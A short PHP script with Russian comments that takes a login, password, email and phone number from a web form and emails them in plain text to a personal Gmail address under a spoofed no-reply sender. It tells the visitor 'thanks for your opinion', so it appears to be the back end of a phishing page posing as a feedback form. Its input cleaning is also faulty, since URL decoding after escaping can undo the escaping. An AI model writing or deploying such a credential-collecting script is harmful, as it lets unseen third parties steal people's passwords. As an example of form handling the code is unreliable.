<?php 
	//данные

	$login = $_POST['login'];
	$pass = $_POST['pass'];
	$email = $_POST['email'];
	$tel = $_POST['tel'];




	// obraz

	$login = htmlspecialchars($login);   // преобразование в символов в сущности
	$pass = htmlspecialchars($pass);
	$email = htmlspecialchars($email);
	$tel = htmlspecialchars($tel);

	$login = urldecode($login);		// декодирование URL
	$pass = urldecode($pass);
	$email = urldecode($email);
	$tel = urldecode($tel);

	$login = trim($login);		// удаление пробелов
	$pass = trim($pass);
	$email = trim($email);
	$tel = trim($tel);



	// отправка до адресата
	
	if (mail("alfredf20165@gmail.com",
			 "Новое письмо с сайта",
			 "Логин: ".$login."\n".
			 "пароль: ".$pass."\n".
			 "Email: ".$email."\n".
			 "Телефон: ".$tel,
			 "From: no-reply@mydomain.ru \r\n")

        )  
	    {
		echo ("Письмо успешно отправлено! Спасибо за ваше мнение =-)");
	    }

	else 
	{
		echo ("Есть ошибка,проверьте данные...=-(");
	}

?>